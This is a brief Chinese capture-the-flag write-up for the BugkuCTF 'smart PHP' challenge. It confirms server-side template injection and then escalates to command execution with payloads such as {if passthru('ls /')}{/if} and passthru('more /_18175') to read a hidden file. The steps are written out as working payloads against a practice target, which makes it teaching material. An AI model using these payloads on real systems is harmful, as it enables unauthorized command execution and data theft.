### BugkuCTF-聪明的php

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220106123214.png)

输入```?a={2*2}```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220106124301.png)

确定是模板注入

加入if标签：

```
?a={if phpinfo()}{/if}
```



![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220106124423.png)

php提供4种方法执行系统外部命令：`exec()、passthru()、system()、 shell_exec()`

这里只能使用```passthru()```

<br>

```
?a={if passthru("ls /")}{/if}
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220106124627.png)

发现一个比较奇怪的文件，由于这里cat命令被禁用了，所以我们采用more命令来查看该文件的内容

```
?a={if passthru("more /_18175")}{/if}
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220106124900.png)

有关模板注入漏洞的知识：

https://eviladan0s.github.io/2021/03/17/Template-injection/

